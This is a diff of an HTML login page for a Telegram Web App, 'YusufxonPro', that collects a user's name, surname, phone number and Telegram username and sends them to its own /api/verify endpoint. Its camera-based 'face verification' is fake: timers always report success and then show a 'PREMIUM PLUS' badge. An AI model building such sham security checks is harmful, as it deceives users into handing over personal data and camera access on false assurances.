@@ -3,149 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>YusufxonPro - Xavfsiz Kirish</title>
+    <title>YusufxonPro - Login</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --blue: #007aff; --bg: #f2f2f7; --card: #ffffff; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background: var(--bg); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        :root { --blue: #007aff; --bg: #f2f2f7; --tg-blue: #24A1DE; }
+        body { font-family: -apple-system, sans-serif; background: var(--bg); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        
+        .card { background: #fff; width: 90%; max-width: 400px; padding: 35px; border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.1); text-align: center; }
+        .card h2 { margin-bottom: 25px; font-weight: 900; letter-spacing: -1px; }
 
-        /* Profil Header */
-        .login-card { width: 90%; max-width: 400px; background: var(--card); padding: 30px; border-radius: 35px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; }
-        .tg-header { display: flex; align-items: center; gap: 15px; background: #f8f9fa; padding: 15px; border-radius: 20px; margin-bottom: 25px; border: 1px solid #eee; text-align: left; }
-        .tg-header img { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--blue); }
-        .tg-header h4 { font-size: 15px; margin: 0; }
-        .tg-header p { font-size: 12px; color: var(--blue); font-weight: 700; margin: 0; }
+        input { width: 100%; padding: 18px; margin: 10px 0; border: none; background: #f2f2f7; border-radius: 20px; font-size: 16px; outline: none; box-sizing: border-box; font-weight: 600; }
+        
+        /* Qotirilgan nomer uchun stil */
+        #phone { color: #000; letter-spacing: 1px; }
 
-        /* Form */
-        .input-group input { width: 100%; padding: 16px; background: #f2f2f7; border: none; border-radius: 18px; margin-bottom: 12px; font-size: 16px; outline: none; }
-        .btn { width: 100%; padding: 20px; border-radius: 20px; border: none; font-weight: 800; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn-black { background: #000; color: #fff; }
+        .btn-main { width: 100%; padding: 20px; border: none; border-radius: 22px; background: #000; color: #fff; font-weight: 800; cursor: pointer; margin-top: 15px; font-size: 16px; transition: 0.2s; }
+        
+        /* Telegram tugmasi */
+        .btn-tg { width: 100%; padding: 18px; border: none; border-radius: 22px; background: var(--tg-blue); color: #fff; font-weight: 700; cursor: pointer; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 15px; }
 
-        /* Face ID UI */
-        #face-ui { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; color: #fff; }
-        .cam-box { width: 280px; height: 280px; border-radius: 50%; border: 4px solid var(--blue); overflow: hidden; position: relative; box-shadow: 0 0 30px var(--blue); }
+        .divider { margin: 20px 0; display: flex; align-items: center; color: #bbb; font-size: 12px; font-weight: 600; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #eee; margin: 0 10px; }
+
+        /* Face ID Qismi */
+        #face-ui { position: fixed; inset: 0; background: #000; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; color: #fff; }
+        .cam-box { width: 280px; height: 280px; border-radius: 50%; border: 4px solid var(--blue); overflow: hidden; position: relative; box-shadow: 0 0 30px rgba(0, 122, 255, 0.5); }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .scan-line { position: absolute; width: 100%; height: 5px; background: var(--blue); top: 0; animation: scan 2s infinite linear; box-shadow: 0 0 15px var(--blue); }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .scan-bar { position: absolute; width: 100%; height: 6px; background: var(--blue); top: 0; animation: scan 2s infinite linear; }
+        @keyframes scan { 100% { top: 100%; } }
 
-        /* Loading Screen (5 soniya) */
-        #loader { position: fixed; inset: 0; background: #fff; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 2000; text-align: center; }
-        .count-num { font-size: 90px; font-weight: 900; color: var(--blue); }
-        .loader-text { font-weight: 700; color: #888; letter-spacing: 1px; margin-bottom: 20px; }
+        #main-app { display: none; position: fixed; inset: 0; background: var(--bg); z-index: 2000; padding: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="login-card" id="step-form">
-        <div class="tg-header">
-            <img id="u-img" src="">
-            <div class="tg-info">
-                <h4 id="u-name">Connect...</h4>
-                <p id="u-tag">@username</p>
-            </div>
-        </div>
+    <div class="card" id="login-screen">
+        <h2>YusufxonPro</h2>
+        <input type="text" id="fname" placeholder="Ism">
+        <input type="text" id="lname" placeholder="Familiya">
+        <input type="tel" id="phone" value="+998 ">
         
-        <div class="input-group">
-            <input type="text" id="inp-name" placeholder="Ism">
-            <input type="text" id="inp-surname" placeholder="Familiya">
-            <input type="tel" id="inp-phone" value="+998 ">
-        </div>
+        <button class="btn-main" onclick="openCamera('manual')">TASDIQLASH</button>
 
-        <button class="btn btn-black" onclick="openFaceID()">TASDIQLASH</button>
+        <div class="divider">YOKI</div>
+
+        <button class="btn-tg" onclick="openCamera('telegram')">
+            <i class="fab fa-telegram"></i> Telegram orqali kirish
+        </button>
     </div>
 
     <div id="face-ui">
         <div class="cam-box">
-            <video id="webcam" autoplay playsinline></video>
-            <div class="scan-line"></div>
+            <video id="video" autoplay playsinline></video>
+            <div class="scan-bar"></div>
         </div>
-        <h2 style="margin-top: 30px; letter-spacing: 2px;">YUZNI SKANERLASH</h2>
-        <p style="color: #8e8e93; margin-top: 10px;">Iltimos, yuzingizni markazga tuting</p>
+        <h2 style="margin-top: 30px; letter-spacing: 2px;">YUZNI TASDIQLASH</h2>
+        <p id="status-text" style="color: #888;">Tekshirilmoqda...</p>
     </div>
 
-    <div id="loader">
-        <p class="loader-text">AKKAUNT TEKSHIRILMOQDA...</p>
-        <div class="count-num" id="timer">5</div>
-        <div id="final-status" style="margin-top: 20px; font-weight: 800; color: #34c759;"></div>
+    <div id="main-app">
+        <div style="background: #fff; padding: 30px; border-radius: 35px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05);">
+            <img id="u-pic" style="width: 90px; height: 90px; border-radius: 50%; border: 3px solid var(--blue);">
+            <h2 id="u-full-name" style="margin-top: 15px;">Foydalanuvchi</h2>
+            <div style="background: #ffd700; color: #000; padding: 6px 15px; border-radius: 12px; font-weight: 800; font-size: 12px; margin-top: 10px; display: inline-block;">PREMIUM PLUS</div>
+        </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand();
+        const user = tg.initDataUnsafe?.user || { first_name: "User" };
 
-        // Telegram profil ma'lumotlarini yuklash
-        const user = tg.initDataUnsafe?.user || { first_name: "Yusufxon", username: "pro" };
-        document.getElementById('u-img').src = user.photo_url || "https://ui-avatars.com/api/?name=" + user.first_name;
-        document.getElementById('u-name').innerText = user.first_name;
-        document.getElementById('u-tag').innerText = "@" + (user.username || "user");
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', (e) => {
+            if (!e.target.value.startsWith('+998 ')) e.target.value = '+998 ';
+            let val = e.target.value.substring(5).replace(/\D/g, '');
+            let res = '+998 ';
+            if (val.length > 0) res += '(' + val.substring(0, 2);
+            if (val.length >= 3) res += ') ' + val.substring(2, 5);
+            if (val.length >= 6) res += '-' + val.substring(5, 7);
+            if (val.length >= 8) res += '-' + val.substring(7, 9);
+            e.target.value = res;
+        });
 
-        let videoStream = null;
+        async function openCamera(type) {
+            const fn = document.getElementById('fname').value;
+            if(type === 'manual' && !fn) return alert("Ismni yozing!");
 
-        // Bosqich 1: Face ID ni ochish
-        async function openFaceID() {
-            if(!document.getElementById('inp-name').value) return alert("Ismingizni kiriting!");
-            
             document.getElementById('face-ui').style.display = 'flex';
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('video').srcObject = stream;
 
-            try {
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('webcam').srcObject = videoStream;
+            setTimeout(() => {
+                document.getElementById('status-text').innerText = "TASDIQLANDI ✅";
+                document.getElementById('status-text').style.color = "#34c759";
+                tg.HapticFeedback.notificationOccurred('success');
 
-                // 3 soniya skaner qiladi va keyingi bosqichga o'tadi
                 setTimeout(() => {
-                    if(videoStream) videoStream.getTracks().forEach(t => t.stop());
-                    document.getElementById('face-ui').style.display = 'none';
-                    startFinalLoading();
-                }, 3000);
-            } catch (e) {
-                alert("Kameraga ruxsat berilmadi!");
-                document.getElementById('face-ui').style.display = 'none';
-            }
+                    stream.getTracks().forEach(t => t.stop());
+                    enterApp(type);
+                }, 1500);
+            }, 3000);
         }
 
-        // Bosqich 2: 5 soniyalik kutish va Python bilan bog'lanish
-        function startFinalLoading() {
-            document.getElementById('loader').style.display = 'flex';
+        function enterApp(type) {
+            document.getElementById('face-ui').style.display = 'none';
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
             
-            const data = {
-                name: document.getElementById('inp-name').value,
-                surname: document.getElementById('inp-surname').value,
-                phone: document.getElementById('inp-phone').value,
-                username: user.username
-            };
+            let finalName = type === 'telegram' ? user.first_name : document.getElementById('fname').value;
+            let finalLName = type === 'telegram' ? (user.last_name || "") : document.getElementById('lname').value;
 
-            // Python (aiohttp) ga yuborish
+            document.getElementById('u-pic').src = user.photo_url || "https://ui-avatars.com/api/?name=" + finalName;
+            document.getElementById('u-full-name').innerText = finalName + " " + finalLName;
+
             fetch('/api/verify', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ name: finalName, surname: finalLName, phone: phoneInput.value, username: user.username })
             });
-
-            let timeLeft = 5;
-            const interval = setInterval(() => {
-                timeLeft--;
-                document.getElementById('timer').innerText = timeLeft;
-
-                if(timeLeft === 2) {
-                    document.getElementById('final-status').innerText = "AKKAUNT TASDIQLANDI ✅";
-                    tg.HapticFeedback.notificationOccurred('success');
-                }
-
-                if(timeLeft <= 0) {
-                    clearInterval(interval);
-                    alert("YusufxonPro tizimiga xush kelibsiz!");
-                    document.getElementById('loader').style.display = 'none';
-                    tg.close();
-                }
-            }, 1000);
         }
-
-        // Telefon nomer formati
-        document.getElementById('inp-phone').addEventListener('input', function (e) {
-            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,2})(\d{0,3})(\d{0,2})(\d{0,2})/);
-            e.target.value = !x[2] ? x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
-        });
     </script>
 </body>
 </html>
